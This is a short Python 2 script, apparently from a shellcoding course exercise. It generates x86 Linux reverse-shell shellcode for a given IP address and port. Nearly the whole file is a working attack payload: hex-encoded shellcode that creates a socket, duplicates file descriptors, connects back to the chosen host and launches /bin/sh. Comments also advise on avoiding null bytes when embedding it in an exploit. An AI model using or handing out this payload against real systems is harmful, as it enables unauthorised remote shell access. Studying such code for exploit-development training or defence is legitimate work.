#!/bin/python

# Author  : Alessio Parzian
# Filename: ShellGen.py
# Usage   : python ShellGen.py $ipaddr $port_number

# This script is an helper to easily configure the ip address and port of the rev shell

# Note that problems might arise due to the presence of 0x00 in the ip addr inserted
# In this exercise is not an issue but when using it as part of an exploit it could be the case
# I prefer simply to work at asm level using the following opcode to avoid badchars
# EX: in case of 127.0.0.1 use the following instead of the common push
# mov byte [esp] = 0x7f
# mov byte [esp+3] 0x01

import sys

try:
	ipaddr = ''
	for ip_byte in sys.argv[1].split("."):
		ipaddr+="\\x"+"{:02x}".format(int(ip_byte))

	port = "{:04x}".format(int(sys.argv[2]))
	port_hex = port
	port = "\\x"+port[:2]+"\\x"+port[2:]

	shellcode = ("\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\x66\\xb8\\x67\\x01"
				 "\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc6\\x89\\xf3\\x31\\xc9\\xb1\\x03\\x31\\xc0"
				 "\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x66\\x05\\x6a\\x01\\x89\\xf3\\x68" +
				 ipaddr + "\\x66\\x68" + port +"\\x66\\x6a\\x02\\x89\\xe1\\x31\\xd2\\x83\\xc2"
				 "\\x10\\xcd\\x80\\x31\\xc0\\x50\\xb0\\x0b\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f"
				 "\\x62\\x69\\x89\\xe3\\x31\\xff\\x57\\x89\\xe2\\x53\\x89\\xe1\\xcd\\x80");


	
	print "[*] Shellcode will connect to addr {} at port {}".format(sys.argv[1], sys.argv[2])
	print "[*] Size: {0} bytes".format(shellcode.count("x"))
	print
	print "[*] Spawing..."
	print
	print shellcode
	
except Exception, e:
	print str(e)
	print 'Please specify port number as parameter in decimal format.\n'
	print 'Usage:'
	print '	python ShellGen.py $ipaddr $port_number'
	exit(-1)